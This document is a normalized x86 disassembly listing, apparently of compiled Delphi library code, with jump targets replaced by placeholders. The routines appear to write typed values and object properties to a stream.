call sub_4055c0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438a6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_43af10
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_4389ac
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_4389ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438a76
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_438aac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438aef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_407214
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ad1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438af6
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_438afc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_438b3f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_407214
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43af08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438b46
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_438b4c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_438bdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_43af10
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4393e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438be2
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_4393dc
mov edx esi
mov eax edi
call sub_431aa4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_439434
mov eax [ ebp - 0x4 ]
call sub_4393e4
inc esi
dec ebx
jne r-xdata
sub_438bec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_4305a0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4110d4
test al al
jne r-xdata
sub_438c3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_438d83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_43caf8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_438bec
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43cacc
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_43caf8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43cacc
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438d8a
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43cacc
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43cacc
test [ eax + 0x24 ] 0x4
je r-xdata
sub_438d90
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43912a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4054c8
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x30 ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0xc ]
mov ebx [ ebp - 0x4 ]
sub ecx [ ebx + 0x10 ]
lea edx [ edx + eax + 0x9 ]
cmp ecx edx
jge r-xdata
sub edx 0x4
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4388f8
mov [ ebp - 0xc ] eax
movzx eax [ r-xdata ]
mov [ ebp - 0x25 ] al
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438a80
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
or [ ebp - 0x25 ] 0x1
or [ ebp - 0x25 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x38 ]
movzx edx [ ebp - 0x25 ]
mov eax [ ebp - 0x4 ]
call sub_4393ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebx + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4054c8
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_43ae34
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov ebx eax
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4057d4
push [ ebp - 0x38 ]
push r-xdata
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4054c8
push [ ebp - 0x3c ]
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_407648
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_43ae34
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
or [ ebp - 0x25 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_439434
mov eax [ ebp - 0x4 ]
call sub_4393e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x24 ] eax
xor eax eax
push ebp
push sub_4390c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ae34
mov eax [ ebp - 0x4 ]
call sub_4388f8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
or [ ebp - 0x25 ] 0x2
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4305a0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4390cb
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x30 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x1c ]
mov [ eax + 0x38 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x28 ] edx
retn
xor eax eax
push ebp
push sub_439082
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1d ] 0x2
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
push eax
push sub_438c3c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov si 0xfffd
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_4055f0
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_438898
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov si 0xfffd
call sub_40587c
test [ ebx + 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] ebx
sub_4390cb
mov eax [ ebp - 0x4 ]
call sub_4393e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439131
lea eax [ ebp - 0x40 ]
mov edx 0x4
call j_sub_4068c4
lea eax [ ebp - 0x2c ]
call j_sub_4068a0
retn
movzx eax [ r-xdata ]
cmp al [ ebp - 0x25 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4388f8
mov edx [ ebp - 0x10 ]
add edx 0x2
cmp eax edx
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_438958
sub_439150
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x28 ] ecx
mov [ ebx + 0x20 ] ecx
mov [ ebx + 0x18 ] esi
mov [ ebx + 0x1c ] esi
mov eax ebx
call sub_43ab1c
mov edx esi
mov eax ebx
call sub_438c3c
pop esi
pop ebx
retn
sub_439178
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x5
mov eax ebx
call sub_43af10
lea edx [ ebp + 0x8 ]
mov ecx 0xa
mov eax ebx
call sub_4389ac
pop ebx
pop ebp
retn 0xc
sub_43919c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0xf
mov eax ebx
call sub_43af10
lea edx [ ebp + 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_4389ac
pop ebx
pop ebp
retn 0x4
sub_4391c0
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x15
mov eax ebx
call sub_43af10
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_4389ac
pop ebx
pop ebp
retn 0x8
sub_4391e4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x10
mov eax ebx
call sub_43af10
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_4389ac
pop ebx
pop ebp
retn 0x8
sub_439208
push ebp
mov ebp esp
push ebx
mov ebx eax
mov dl 0x11
mov eax ebx
call sub_43af10
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_4389ac
pop ebx
pop ebp
retn 0x8
sub_43922c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx r-xdata
mov eax esi
call sub_4110d4
test al al
je r-xdata
mov edx r-xdata
mov eax esi
call sub_4110d4
test al al
je r-xdata
mov dl 0x8
mov eax ebx
call sub_43af10
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_4110d4
test al al
je r-xdata
mov dl 0x9
mov eax ebx
call sub_43af10
jmp r-xdata
mov edx r-xdata
mov eax esi
call sub_4110d4
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_43af10
jmp r-xdata
pop esi
pop ebx
retn
mov dl 0x7
mov eax ebx
call sub_43af10
mov edx esi
mov eax ebx
call sub_43ae34
mov dl 0xd
mov eax ebx
call sub_43af10
jmp r-xdata
sub_439310
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_43af10
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4389ac
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_43af10
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4389ac
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_43af10
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_4389ac
jmp r-xdata
pop edx
pop ebx
retn
sub_439384
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov dl 0x13
mov eax ebx
call sub_43af10
lea edx [ ebp + 0x8 ]
mov ecx 0x8
mov eax ebx
call sub_4389ac
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ebx
call sub_439310
jmp r-xdata
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_4393ec
push ebx
push esi
push ecx
mov esi ecx
mov [ esp ] dl
mov ebx eax
movzx eax [ r-xdata ]
cmp al [ esp ]
je r-xdata
pop edx
pop esi
pop ebx
retn
movzx eax [ esp ]
or al 0xf0
mov [ esp + 0x1 ] al
lea edx [ esp + 0x1 ]
mov ecx 0x1
mov eax ebx
call sub_4389ac
test [ esp ] 0x2
je r-xdata
mov edx esi
mov eax ebx
call sub_439310
sub_439434
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0xffffffb8
mov eax [ eax ]
call sub_422f98
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
add eax eax
add eax eax
call sub_404204
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4394e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0xffffffb8
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_423338
mov esi [ ebp - 0xc ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0xc ]
add edx edx
add edx edx
mov eax [ ebp - 0x10 ]
call sub_404220
retn
inc esi
xor edi edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_42338c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a58c
mov eax [ ebp - 0x10 ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
sub_439514
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4233bc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax 0x80000000
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4233bc
cmp ebx eax
sete al
pop ebx
pop ebp
retn
xor eax eax
jmp r-xdata
cmp eax ebx
je r-xdata
pop ebx
pop ebp
retn
mov al 0x1
sub_43956c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423f18
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
sete al
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_423f18
fld [ ebp - 0x10 ]
fcompp
fwait
fnstsw ax
sahf
sete al
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4395c8
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424334
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_424334
cmp edx [ ebp - 0x4 ]
jne r-xdata
sete al
cmp [ ebp - 0x8 ] 0x0
sete al
jmp r-xdata
cmp eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_439620
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_43969f
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_423978
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
call j_sub_406f64
sete bl
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_423978
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call j_sub_406f64
sete bl
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4396a6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_406d6c
retn
sub_4396b0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4110d4
test al al
jne r-xdata
mov al 0x1
sub_4396f0
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4233bc
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_4396b0
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_439748
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4233bc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
push ebp
call sub_4396f0
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_4396f0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4397c8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_439874
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43987b
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_424398
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4396b0
pop ecx
mov ebx eax
sub_439894
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_439951
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_424398
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439958
lea eax [ ebp - 0x10 ]
call sub_409cb4
lea eax [ ebp - 0xc ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_424398
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_4397c8
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_439970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov eax ebx
xor edx edx
call sub_4070a8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
push ebx
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
lea ecx [ ebp - 0x8 ]
mov eax [ esi + 0x4 ]
call [ esi ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_405a24
sub_4399c8
push ebp
mov ebp esp
add esp 0xffffffec
